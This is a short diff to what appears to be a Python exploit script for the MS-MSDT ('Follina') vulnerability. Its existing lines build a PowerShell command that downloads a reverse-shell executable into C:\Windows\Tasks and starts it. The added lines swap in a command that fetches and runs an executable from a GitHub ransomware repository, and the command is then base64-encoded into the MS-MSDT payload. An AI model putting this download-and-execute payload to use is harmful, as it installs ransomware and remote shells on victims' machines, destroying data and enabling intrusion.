@@ -32,6 +32,11 @@ cmd = (
     "-OutFile C:\\Windows\\Tasks\\rev.exe; "
     "Start-Process C:\\Windows\\Tasks\\rev.exe"
 )
+cmd = (
+    "Invoke-WebRequest https://raw.githubusercontent.com/HoangTPMAFK/c-ransomware/main/victim/victime_tool.exe "
+    "-OutFile C:\\Windows\\Tasks\\ran.exe; "
+    "Start-Process C:\\Windows\\Tasks\\ran.exe"
+)
 b64 = base64.b64encode(cmd.encode()).decode()
 
 # MS-MSDT payload
